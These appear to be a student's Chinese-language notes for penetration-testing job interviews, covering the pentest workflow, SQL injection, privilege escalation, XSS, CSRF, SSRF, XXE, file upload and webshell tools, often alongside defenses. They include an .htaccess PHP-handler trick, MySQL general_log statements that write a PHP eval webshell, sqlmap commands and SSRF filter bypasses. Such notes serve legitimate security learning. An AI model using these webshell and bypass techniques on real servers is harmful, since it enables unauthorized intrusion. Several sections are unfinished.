# 2023届面试题个人学习记录总结

> **按照技术种类划分试题**


## 技术篇——WEB

### 1. 渗透的流程 or 拿到一个待检测的站，你觉得应该做什么？

> 首先拿到书面的授权书
>
> 1. 信息收集 [2022渗透测试面试大全（过来人的全部家底） (chowdera.com)](https://chowdera.com/2022/122/202205022132180805.html#渗透测试流程)
>    + 给了一个网址，whois反查信息，获取域名注册者的邮箱和手机号等信息；
>    + 查看是否有CDN；🚩
>    + 查询服务器旁站以及子域名站点，因为主站一般比较难渗透，所有先看看旁站有没有通用醒的cms或者其他漏洞；
>    + 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，例如IIS、Apache、Nginx的解析漏洞；
>    + 扫描IP端口，进行IP端口的扫描，对响应的端口进行探测，比如mysql-3306、ftp-21、ssh-22等；
>    + 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄露。
>    + google hack 进一步探测网站的信息，后台，敏感文件；
>    + 可以对网站架构探测-获取网站的插件信息，比如所js版本、cms类型，中间件信息。如火狐插件wappalyzer，cms指纹识别；
>    + 资产收集工具-灯塔系统。
> 2. 漏洞扫描
>    + 开始检测漏洞，使用漏扫工具，如awvs、nessus、appscan、xray。同时，配合手动测试，如SQL注入、xss跨站脚本、CSRF跨站请求伪造、XXE漏洞、ssrf服务端请求伪造、文件上传、文件包含、远程代码执行、越权访问、反序列化、文件解析漏洞等。
> 3. 漏洞利用
>    + 可以利用一些方式拿到webshell。如SQL注入-sqlmap，xss跨站脚本-Beef-xss、抓包工具-burp、文件上传漏洞-一句话木马；
> 4. 权限提升
>    + 获得了webshell后，一般权限很低，需要进行提权操作。在这里先简单介绍提取方式
>    + windows提权：内核漏洞、服务配置错误等
>    + linux提权：suid、内核漏洞、docker逃逸等
>    + mysql提权：udf、mof等

### 2. 如何查找部署CDN网站的真实IP?    ***

> 1. 子域名解析
> 2. 国外dns获取真实ip；
> 3. ico图标通过空间搜索找真实ip
> 4. 

### 3. 业务逻辑漏洞  ***

> 1. 越权漏洞
>    + 水平越权：一般是修改get或post参数来查看其他人的业务信息，一般是在订单处或个人信息处。例如：2个账号，修改账号1的get或post数据包参数去查看账号2的信息。
>    + 垂直越权：两个账号，一个普通账号、一个管理员账号，抓包修改管理员的参数，权限改变，普通账号拥有管理员的部分或全部权限。
> 2. 密码找回
>    + 攻击者只要通过在本地抓取数据包并对其内容加以分析就能获取到其他用户的用户凭证，从而达到重置任意用户密码的目的；
>
> [逻辑漏洞挖掘|常见小结](https://mp.weixin.qq.com/s?__biz=MzU1NzgyMzA0OA==&mid=2247484699&idx=1&sn=df6d578a76596b3f364fe80cd71d1ad3&chksm=fc2ea03ccb59292a500deddc6bf05c2ddd9662788d1159f0964dfce6b6cde96bce64813edd79&scene=21#wechat_redirect)

### 4. owasp top10

![mapping](2023届面试题个人总结.assets/mapping.png)

~~~
A01:2021-权限控制失效
A02:2021-加密机制失效
A03:2021-注入式攻击
A04:2021-不安全设计 
A05:2021-安全设定缺陷
A06:2021-危险或过旧的组件 
A07:2021-认证及验证机制失效
A08:2021-软件及资料完整性失效 
A09:2021-安全记录及监控失效 
A10:2021-服务器端请求伪造 
~~~

### 5. 拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？

> 修改htaccess文件的内容，从而插入解析信息：
>
> <FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php  \</FilesMatch>
> 
> 这样就制造了个apache解析漏洞, xxx.jpg 文件会被解析成.php 文件。

### 6. 在某后台新闻编辑界面看到编辑器，应该先做什么？

> 查看编辑器的版本信息，google 公开的EXP

### 7. 3389端口无法连接的情况？

> 1. 本来3389端口就没打开
> 2. 处于内网，需要端口转发 ，使用lcx工具
> 3. 端口被修改了
> 4. 防护拦截

### 8. 如何手工快速判断目标站是 windows 还是 linux 服务器？

> 尝试在数据包中传参，Linux大小写敏感，windows大小写不敏感

### 9. SQL注入

> 1. **简介**
>
>    + 主要原因就是程序员在开发用户和数据库交互的系统时没有对用户输入的字符串进行过滤、转义，限制或处理不严谨，导致用户可以通过输入精心构造的字符串去非法获取到数据库中的信息。
>
> 2. **分类**
>
>    + 依据注入点类型分类：
>
>      + 数字型注入
>      + 字符型注入
>      + 搜索型注入（like）
>
>    + 依据获取信息的方式分类：
>
>      + 联合注入
>
>      + 基于时间的盲注（根据数据包返回延迟判断）
>
>      + 基于布尔的盲注（根据返回页面判断条件真假）
>
>      + 基于报错注入（页面会返回报错信息）
>
>      + 堆叠注入（同时执行多条语句）
>
>    + 依据提交方式分类：
>
>      + GET注入
>      + POST注入
>      + COOKIE注入
>      + HTTP头注入（XFF注入、UA注入、Referer注入）
>
> 3. **防御 :triangular_flag_on_post:**
>
>    + 使用预编译语句，绑定变量
>    + 过滤特殊字符
>    + 检查变量的数据类型和格式
>    + 使用白名单来规范化输入验证方法
>
> 4. **绕过waf**
>
>    + 替换关键词
>    + 替换大小写
>    + 插入注释
>    + 编码：16进制编码、Unicode编码
>    + 特殊符号
>    + 缓冲区溢出
>
> 5. **SQL注入流程**
>
>    + 首先判断注入是否有回显，有回显尝试联合查询，无回显查看是否有数据库报错信息，有报错信息尝试报错注入；无回显无报错信息尝试盲注；
>    + sqlmap怎么对一个注入点注入？
>      + get提交：sqlmap -u 注入点网址
>      + post提交：sqlmap -u “注入点网址” --data=“post参数” 或者 sqlmap -r “数据包文件”
>      + 如果是http头里面的字段等信息，可以访问的时候，⽤ burpsuite 抓包，**注⼊处⽤*号替换**，放到⽂件⾥，然后sqlmap -r "⽂件地址”
>
> 6. **布尔盲注和延时盲注的共同点？**
>
>    + 都是一个字符一个字符的判断
>
> 7. **报错注入函数**
>
>    + updatexml()
>    + extractvalue()
>    + floor()
>
> 8. **information_schema数据表获取信息**
>
>    + 获取数据库名
>
>      select schema_name from information_schema.schemata
>
>    + 获取数据表名
>
>      select table_name from information_schema.tables
>
>    + 获取字段名
>
>      select * from information_schema.columns where table_name = “” and table_schema=“”
>
>    + 获取数据
>
>    + select id,user,password from user

### 10. Windows和Linux上提权的方式

**Linux提权**

> 1. 内核提权（脏牛）
> 2. suid提权
> 3. 定时任务提权
> 4. passwd提权
> 5. ssh密钥提权：获取到了.ssh目录下用户的私钥
> 6. 环境劫持提权：利用的两个条件：1）存在带有suid的文件；2）suid文件存在系统命令
> 7. shadow文件中root的密码被破解提权
> 8. sudo提权
> 9. 。。。。

**Windows提权**

> 1. 内核提权（烂土豆）
> 2. windows系统配置错误提权
> 3. 本地dll配置文件提权
> 4. SqlServer提权
> 5. mysql提权
> 6. 。。。。。

### 11. mysql写shell需要哪些条件

> 1. root权限
> 2. 知道网站的路径而且拥有写权限，能够通过into outfile 和 into dumpfile
> 3. secure-file-priv=
> 4. gpc关闭

### 12. **phpmyadmin如果不能通过out file写shell，还有哪些方式。**

> 利用：日志备份获取shell
>
> general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。可以尝试自定义日志文件，并向日志文件里面写入内容的话
>
> 

查看当前日志文件：

~~~mysql
 SHOW VARIABLES LIKE 'general%';
~~~


开启日志记录

~~~mysql
set global general_log = "ON";
~~~

更改日志文件路径

~~~mysql
set global general_log_file='C:\\xampp\\htdocs\\tieuhoc\\b.php'
~~~

往日志文件里写入一句话木马

~~~mysql
select '<?php @eval($_POST[cmd]);?>';
~~~

### 13. 如果不是默认路径，如何去获得写shell的路。

> 1. 数据库查询：show variales like %basedir%;
> 2. 查看phpinfo
> 3. 查看mysql安装情况
> 4. 报错信息

### 14. sql注入获取mysql本身路径的函数

>  @@datadir

### 15. JWT 

> Json Web Token
>
> JWT由三部分组成，Header.Payload.Signature

### 16. xss弹框函数

> alert 、prompt、confirm、console.log()等等

### 17. **如果localhost，127.0.0.1被封禁，如何绕过**

>  10进制ip地址转换为16进制

### 18. **命令执行，不回显如何拿结果，不出网如何**

> 延时（ping -c xxx.xxx.xxx.xxx）,dnslog,http请求,命令内容输出到特定文件并下载

### 19. **如何利用任意文件下载漏洞**

> 任意文件下载漏洞的话，可以下载一些敏感文件或信息，比如db.config可以获得数据库的账号密码

### 20. **如何知道网站目录，tomcat的路径。**

> 报错，通过代码：application.getRealPath()获得项目的路径。

### 21. **CSRF如何修复**

> 增加Token 和 Referer字段

### 22. referer可以绕过，如何检测referer能否被绕过

> 使用子域名绕过，域名增加a-z和0-9可以绕过，域名重写

### 23. **shiro反序列化原理**

>  Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与Web 集成、缓存等。

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。

### **24.主流的shiro检测key爆破原理，不出网如何检测**   ********



### **25.如何判断使用fastjson*********



### **26.fastjson的gadget*********



### **27.如果一个网站被上传了webshell，如何排查入侵点**

> 先使用一些工具，对全站源码进行扫描，对网站修改时间进行排查，查看日志文件，网络连接、进程分析等等

### **28.预编译原理**

> 提前编译SQL语句，将所有的用户输入都当做数据，而非语法；
>
> 预编译会让数据库跳过编译阶段，也就无法进行词法分析，关键字不会被拆开，所有参数直接变成字符串，进入数据库执行器执行

### **29.udf原理**

> udf（user-defined function）是mysql数据库的一个扩展接口，也可称为用户自定义函数，它是用来扩展mysql的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现mysql中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用。

### **30. udf提权的条件**

> 1. mysql数据库的root权限
> 2. 有导入导出的权限，即secure_file_priv为空白
> 3. 有上传目录
> 4. 账号具有insert和delete权限 (以root账号为佳)

~~~
根据mysql数据库的版本确定上传的脚本目录：
1. mysql<5.1，导出目录c:/windows或system32
2. mysql=>5.1，导出mysql/lib/plugin/的绝对路径（如C:/phpstudy/mysql/lib/plugin/），这个目录大概率是不存在的，如果没有需要创建;
 
~~~

利用方式：[MySQL数据库UDF提权学习_Goodric的博客-CSDN博客_mysql数据库udf提权](https://blog.csdn.net/Goodric/article/details/125916936)

### 31. php代码审计流程

> 简单的SQL审计，seay工具扫描漏洞点，整体查看程序架构，查看功能函数模块，查看GET、POST传参点是否配合命令执行函数；查看SQL语句是否对输入的字符串进行过滤，SQL报错信息是否输出等问题；

### **32. java反射** ********





### 33. shiro未授权 \***



### 34.  weblogic常见漏洞 ***



### 35. --os-shell条件及原理

**条件**

> 1. 数据库是root权限
> 2. 知道网站的绝对路径
> 3. 拥有写入权限
> 4. 关闭gpc

**原理**

> 就是写入两个php文件，其中的`tmpugvzq.php`可以让我们上传文件到网站路径下;
>
> 然后sqlmap就会通过上面这个php上传一个用于命令执行的`tmpbylqf.php`到网站路径下，让我们命令执行，并将输出的内容返回sqlmap端。

### 36. **nmap常用命令参数 *****

~~~shell
-A: 包括参数sC、sV和路由信息;
-sC:执行一些常用的脚本，比如可以扫描出ftp服务是否开启匿名登录;
-p: 要扫描的端口信息,我一般使用-p-来对65535个端口全部扫描;
-vv:输出扫描过程中的交互信息
-Pn:
-sV: 扫描目标端口开启的服务版本信息
-oG: 
--script: 
~~~

### 37. XSS漏洞 

> 1. 简介
>
>    XSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往web页面中插入恶意JavaScript代码，当用户浏览该页面的时候，嵌入到web页面中的script代码会执行，因此会到达恶意攻击用户的目的。
>
> 2. 类别
>
>    + 反射型
>
>      + 通过web站点漏洞，向被攻击者交付恶意代码，实现对用户的攻击；
>
>      + 利用条件：
>
>        1）服务器对用户提交数据过滤不严格；
>
>        2） web站点能够返回用户输入的恶意脚本数据
>
>        3） 脚本被浏览器成功解析并执行
>
>    + 存储型
>
>      + 存储型xss是hacker向服务器注入一段js代码，代码存储到服务器的数据库中，每当用户访问服务器当中带有js代码的数据时，服务器将响应用户，返回给用户数据库中的恶意代码。
>
>    + DOM型
>
>      + 通过修改页面的DOM节点形成的XSS，称之为DOM XSS；效果跟反射型XSS类似
>        攻击者在URL中插入XSS代码，前端页面直接从URL中获取XSS代码并且输出到页面，导致XSS代码的执行，攻击者将带有XSS代码的URL发给用户，用户打开后受到XSS攻击。
>
> 3. 危害
>
>    + 盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号等；
>    + 网站挂马；
>    + 窃取Cookie；
>    + 控制受害者机器向其它网站发起攻击；
>    + ......
>
> 4. 攻击的条件
>
>    + 向web页面注入恶意代码
>    + 这些恶意代码被浏览器成功解析并执行
>
> 5. 防御措施
>
>    + 在不需要html输入的地方对html 标签及一些特殊字符( ” < > & 等等 )做过滤，将其转化为不被浏览器解释执行的字符；
>    +  对输出的内容进行过滤，针对网站需要输出的html内容用进行关键字过滤；
>    + cookie 防盗，设置HTTPOnly。避免直接在cookie中泄露用户隐私，例如email、密码，等等；

### 38. 同源策略

>  同源策略就是浏览器的一个安全限制，它阻止了不同【域】之间进行的数据交互
>
> 协议，域名，端口相同

### 39. **得到域名的信息收集思路**

> 1. 找到真实ip地址 
> 2. 子域名扫描
> 3. 目录扫描和子域名目录文件扫描
> 4. 端口服务扫描
> 5. C段扫描
> 6. whois信息
> 7. 备案信息
> 8. 中间件漏洞
> 9. 黑暗引擎搜索
> 10. 查看网站，挂代理查看数据包
> 11. 网上查找是否存在源码泄露，白盒代码审计；
> 12. github搜索是否存在配置文件泄露；
> 13. 。。。。

### 40. 文件上传漏洞

[文件上传漏洞之验证及绕过原理](https://mp.weixin.qq.com/s?__biz=MzU1NzgyMzA0OA==&mid=2247484053&idx=1&sn=9de06f408b73bc479c6337305d16e7c4&chksm=fc2ea7b2cb592ea41382aa92db31ffb639cf1bf633c2d278ac60ce74be2eecb6ffb34e23ba19&scene=21#wechat_redirect)

> 1. 原理
>    + 由于程序员在用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本
> 2. 危害
>    + 操作木马文件提权，获取网站权限
> 3. 绕过方法
>    + 黑名单
>      + 前端绕过
>      + 特殊的文件后缀名，例如php5、phtml、pht等
>      + .htaccess文件  
>      + .ini文件（条件，上传的目录下有php文件）
>      + 大小写
>      + 后缀名加点或者空格
>      + ::$DATA
>      + 双写php后缀名
>      + 中间件解析漏洞（IIS6.x、IIS7.x、nginx、apache等）
>    + 白名单
>      + %00截断
>      + MIME
>      + 图片马配合文件上传漏洞
>    + 文件及其内容验证/绕过
>      + 文件头检测
>      + 条件竞争
>      + 二次渲染
> 4. 防御方法：
>    + 后端验证：基于白名单，黑名单过滤；
>    + MIME验证：基于上传自带类型检测；
>    + 内容检测：文件头、完整性检测；
>    + 特殊字符过滤；
>    + 自带函数过滤；
>    + waf；

### 41. webshell原理

> WebShell是黑客经常使用的一种恶意脚本，原理就是利用Web服务器自身的环境运行的恶意代码。从名字来看Web指的是网页服务，Shell指的是计算机程序运行的指令命令。这也揭示了WebShell的攻击方法，就是通过WebShell脚本的上传，利用网页服务程序实现操控服务器的一种方式。

### 42. webshell常用工具  。。。。

[四大主流WebShell管理工具分析 | 防守方攻略 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9397)

> 1. **中国菜刀**
>
>    + 简介：
>      + 中国菜刀是一款经典的网站管理工具，具有文件管理、数据库管理、虚拟终端等功能；
>
>    + 检测：
>      + 文件检测：通过静态文件的方式进行webshell查杀；
>      + 流量检测：通过检测通信中的eval、base64
>
> 2. 中国蚁剑
>
>    + 简介：
>      + 中国蚁剑和中国菜刀相比，界面更加美观，功能更加齐全，并且自定义的程度更高且开放源代码；中国蚁剑的服务端会根据不同编码器有所变化，但还是从最基础的开始分析；
>    + 配置：
>      + a
>
> 3. 冰蝎
>
>    + 简介：
>      + 冰蝎shell管理工具是一款流行的、采用二进制动态加密传输数据的网站管理工具；
>    + 配置：
>      + 目前冰蝎Shell管理工具的配置仅支持代理和自定义HTTP头部。

### 43. CSRF漏洞

> 1. 原理
>    + CSRF跨站脚本请求伪造。攻击者盗用了受害者的身份，以受害者的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作。
> 2. 危害
>    + 修改受害网站上的用户账号和数据；
>    + 账号劫持；
>    + 传播CSRF蠕虫进行大规模攻击；
>    + 利用CSRF拖库；
>    + 利用其他漏洞进行组合拳攻击；
> 3. 防护
>    + 尽量使用POST，限制GET方法；
>    + 浏览器Cookie策略；
>    + 危险操作再次输入密码；
>    + 限制Referer；
>    + 增加Token字段；

### 44. 文件包含漏洞

> 1. 类型
>    + 本地文件包含
>    + 远程文件包含：即加载远程文件，在`php.ini`中开启allow_url_include和allow_url_fopen选项。开启后可以直接执行任意代码；
> 2. 文件包含函数
>    + include()
>    + include_once()
>    + require()
>    + require()_once()
> 3. 危害
>    + 读取敏感文件
>    + 远程包含shell
>    + 文件包含上传的图片马
>    + 文件包含访问日志文件GetShell
>    + 使用伪协议执行系统命令
> 4. 防御措施
>    + 禁止远程文件包含allow_url_include=off
>    + 配置open_basedir=指定目录，限制访问区域
>    + 获取../等特殊字符
>    + 修改web中间件日志文件的存放位置
>    + 尽量不要使用动态变量传参来控制要包含的文件，直接固定参数
> 5. 伪协议
>    + php://input 配合post参数
>    + php://filter
>    + data://text/plain;base64,……

### 42. SSRF漏洞

> 1. 原理
>    + SSRF（Server-Side Request Forgery：服务端请求伪造）是一种由攻击者构造形成的由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统；
> 2. 危害
>    + 穿透防火墙
>    + 攻击内网或本地其他服务
>    + 探测内网信息
> 3. 具体利用的方式
>    + 具体操作需要查看支持的协议，file协议查看文件、dict协议探测端口、gopher协议支持GET&POST请求，同时在攻击内网ftp、redis、telnet等上有极大作用
> 4. 漏洞存在的地方
>    + 能够对外发起网络请求的地方
>    + 请求远程服务器资源的地方
>    + 数据库内置功能
>    + 邮件系统
>    + 文件处理
> 5. 绕过限制
>    + 利用IP地址的省略写法绕过，[::]绕过localhost
>    + DNS解析 http://127.0.0.1.xip.io/可以指向任意ip的域名：xip.io
>    + 利用进制转化，把十进制ip地址转换为8进制或者16进制
>    + http://xxx.com@127.0.0.1
>    + 利用句号`。`：`127。0。0。1`==>`127.0.0.1`
> 6. 防御措施
>    + 地址做白名单处理
>    + 域名识别ip，限制内部ip
>    + 校验返回的内容对比是否与假定的一致

### 44. XXE漏洞

> 1. 原理
>    + xml的漏洞注入全程(xml External Entity Injecttion-xml外部实体注入)，解析用户传入的xml内容；
>    + XXE漏洞发生在应用程序解析XML输入时，没有**禁止外部实体的加载**，**导致可加载外部恶意的文件**，**造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击**等危害。XXE漏洞触发的点往往是可以上传xml格式文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
> 2. 危害
>    + 命令执行
>    + 加载恶意外部文件
>    + 内网端口扫描
>    + 攻击内网网站
>    + DDOS
> 3. 防御：
>    + 过滤用户提交的xml数据
>    + 当使用的程序语言为PHP时，则可以将`libxml_disable_entity_loader`设置为TRUE来禁用外部实体，从而起到防御的目的;

### 45. 代码执行漏洞





## 技术篇——内网

[内网渗透到后渗透的基本思路 · Ywc's blog (yinwc.github.io)](https://yinwc.github.io/2019/08/14/内网渗透与后渗透/)



### **内网传输的主要协议**

### **域渗透**

### **免杀**

### **内网渗透经历**

### **kerberos协议具体分析**

> Kerberos是Windows域首选的一种认证协议，优于NTLM认证机制

## 技术篇——系统运维







## 技术篇——网络

## 个人通用篇

1. 自我介绍
2. 